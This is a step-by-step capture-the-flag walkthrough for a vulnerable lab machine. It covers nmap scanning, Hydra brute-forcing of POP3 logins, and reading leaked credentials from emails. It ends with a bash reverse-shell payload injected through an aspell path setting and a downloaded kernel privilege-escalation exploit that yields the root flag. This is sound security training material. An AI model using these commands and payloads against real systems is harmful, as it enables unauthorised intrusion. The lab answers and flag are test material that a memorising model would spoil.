### Use nmap to scan the network for all ports. How many ports are open?
The Nmap scan shows that 4 ports are open.
```BASH
sudo nmap -sV -p- $ip
```
![image](https://github.com/user-attachments/assets/511e7d14-e345-48d8-91ec-2f262840b7e7)


<pre>4</pre>

<span style="line-height:0.5;">&nbsp;</span>

### Who needs to make sure they update their default password? Whats their password?
Using browser’s devs tools in the Inspector tab reveals that there is JavaScript file named `terminal.js`.  

![image-1](https://github.com/user-attachments/assets/6d7bfcd5-5510-42e1-a8b7-1b1aa5c35351)

Open terminal.js in debbuger tab. You will find a note left by Boris to Natalya, including credentials.

![image-2](https://github.com/user-attachments/assets/8aeb9e6b-4e8b-4cae-b694-1832adcfb4cd)

<pre>boris</pre>

Use [CyberChef](https://gchq.github.io/CyberChef/) to decode the string found in the script.

The decoded password is:  

![image-3](https://github.com/user-attachments/assets/64936586-cf63-495c-b578-fa07885ce758)

<pre>InvincibleHack3r</pre>

<span style="line-height:0.5;">&nbsp;</span>


### If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra? Whats their new password?
First, try logging into POP3 using telnet:  

```BASH
telnet $ip 55007
```

If logging in with the current credentials shows that you lack privileges (or you receive an error), proceed with brute-force. Use Hydra to brute-force the POP3 credentials for user boris:
```BASH
hydra -l boris -P /usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.txt $ip -s 55007 pop3
```

<pre>secret1!</pre>

<span style="line-height:0.5;">&nbsp;</span>

### Inspect port 55007, what service is configured to use this port?
<pre>pop3</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What can you find on this service?
Log in as user boris using telnet:
```BASH
telnet $ip 55007
``` 

Then enter the following commands:
```BASH
USER boris
PASS secret1!
```  

![image-4](https://github.com/user-attachments/assets/ced30e66-c3af-4884-8d05-29e5e69e8de8)


List and read emails:
```BASH
LIST
RETR $message_id
```

![image-5](https://github.com/user-attachments/assets/53c1e6a7-bee0-4ea1-a9b2-242710dddac9)

<pre>emails</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What user can break Boris' codes?  

![image-6](https://github.com/user-attachments/assets/521759e9-9059-4ffa-8388-c2f056feced7)

<pre>natalya</pre>

Also, a third email reveals another user: Xenia.  

![image-7](https://github.com/user-attachments/assets/23689d7c-d631-4210-b157-566b5c9fe3a6)

Brute-force POP3 for user natalya using Hydra with a default credentials wordlist:
```BASH
hydra -l natalya -P /usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.txt $ip -s 55007 pop3
```

<pre>bird</pre>

Use Natalya’s credentials to log in via telnet as before. In the second email obtained after logging in, you will see credentials for Xenia: 

![image-8](https://github.com/user-attachments/assets/0d7e1e66-02d7-44c0-8bda-d659f3415b87)

<pre>xenia</pre>
<pre>RCP90rulez!</pre>

<span style="line-height:0.5;">&nbsp;</span>

Additionally, note the internal domain provided:
<pre>severnaya-station.com/gnocertdir</pre>

<span style="line-height:0.5;">&nbsp;</span>

This detail indicates you need to update the /etc/hosts file.
```BASH
nano /etc/hosts
```
![image-9](https://github.com/user-attachments/assets/103c0c54-7dd7-4a64-aec9-8833a2c4c798)

<span style="line-height:0.5;">&nbsp;</span>

### Try using the credentials you found earlier. Which user can you login as?
Log in as Xenia.  

![image-10](https://github.com/user-attachments/assets/6c06207a-083f-41f9-a7ed-667f1ddeb3ba)

<pre>Xenia</pre>

<span style="line-height:0.5;">&nbsp;</span>

### Have a poke around the site. What other user can you find?
You will find message exchanges between Xenia and Doak:

![image-11](https://github.com/user-attachments/assets/bcd689a2-8d2b-4c41-b9bd-37d178de4894)

<pre>Doak</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What was this users password?
Run Hydra on the POP3 service for user dork.

```BASH
hydra -l dork  -P /usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.txt $ip -s 55007 pop3
```

<pre>goat</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is the next user you can find from doak? What is this users password?
Doak has one message where credentials for dr_doak are provided:

![image-12](https://github.com/user-attachments/assets/449d40e6-15e4-4d13-9ec5-e72289aafad4)

<pre>dr_doak</pre>
<pre>4England!</pre>

Log in as dr_doak on the website. In dr_doak's personal files, you will see a file named `s3cret`.

![image-13](https://github.com/user-attachments/assets/8ad609b9-e985-4563-943b-e7cb69c542f8)

![image-14](https://github.com/user-attachments/assets/48527fb3-dbb4-4df5-a960-e231fc82e3fa)

Go to `severnaya-station.com/dir007key/for-007.jpg` and download the image. Use exiftool on your local machine to inspect its metadata. The image description contains an encrypted string. Paste the value into CyberChef to decrypt it.

![image-17](https://github.com/user-attachments/assets/02f77cd4-e9f0-477e-9d30-265c9212f529)

![image-15](https://github.com/user-attachments/assets/ce764fd9-73dc-4cfd-8deb-886401a48d4e)

<pre>xWinter1995x!</pre>

Return to the website and log in as admin using this password. Then, search for “aspell” in the site’s search input. You will discover that the aspell path can be exploited to obtain a reverse shell. 

<span style="line-height:0.5;">&nbsp;</span>

Set up your Netcat Listener on Your Machine:  

```BASH
netcat -lnvp 4444
```

![image-18](https://github.com/user-attachments/assets/ee3ae60a-4867-4258-b30f-32b2219317e6)

In the aspell path input field, provide the following payload:
```BASH
bash -c 'exec bash -i &>/dev/tcp/10.10.166.60/4444 <&1'
```

![image-25](https://github.com/user-attachments/assets/0d86620d-ab19-430a-9be6-80d44a99f5db)

Then, force the spellchecker to run so the payload executes. Once you have a reverse shell, stabilize it:
```BASH
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image-26](https://github.com/user-attachments/assets/8a5b8ae5-b468-4f4d-86f9-8abed106a519)

<span style="line-height:0.5;">&nbsp;</span>

### Whats the kernel version?
```BASH
uname -a
```

![image-27](https://github.com/user-attachments/assets/b40972b1-5233-4809-88cc-a230c662a196)

<pre>3.13.0-32-generic</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What development tools are installed on the machine?
### What is the root flag?

Download the [Linux Kernel 3.13.0 exploit](https://www.exploit-db.com/exploits/37292) on your machine. Before transferring the exploit to the target, you must edit the source file. The exploit normally contains a line such as:
```BASH
 lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
```  

Since gcc is not available on the server but cc is, change this line to:
```BASH
 lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
```

Start a Python HTTP server on your attacker machine:
```BASH
python3 -m http.server 8000
```

On the target machine (using your reverse shell), download the exploit:
```BASH
wget http://10.10.166.60:8000/37292.c
```
![image-28](https://github.com/user-attachments/assets/fe509857-15fb-4e53-acfc-fe3a64cec80b)


Compile and run the exploit on the target:
```BASH
gc 37292.c -o lpe
./lpe
```
![image-29](https://github.com/user-attachments/assets/b2b5260a-7d94-49d9-b578-2f74b9483b78)


Once the exploit runs, change directory to root:  

![image-30](https://github.com/user-attachments/assets/6b0b62e0-d659-41e3-a506-fed6717937f5)


<pre>568628e0d993b1973adc718237da6e93</pre>
